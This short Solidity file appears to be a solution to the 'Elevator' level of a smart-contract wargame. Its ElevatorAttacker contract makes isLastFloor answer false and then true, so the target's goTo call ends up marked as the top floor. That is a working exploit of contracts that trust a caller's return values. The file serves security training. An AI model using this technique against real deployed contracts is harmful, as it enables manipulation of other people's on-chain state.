// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/11-Elevator.sol";

contract ElevatorAttacker is Building {
    bool public top;
    Elevator public elevator;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns (bool) {
        bool isTop = top;
        top = !top;
        return isTop; // 1. false 2. true
    }

    function attack() public {
        elevator.goTo(420);
    }
}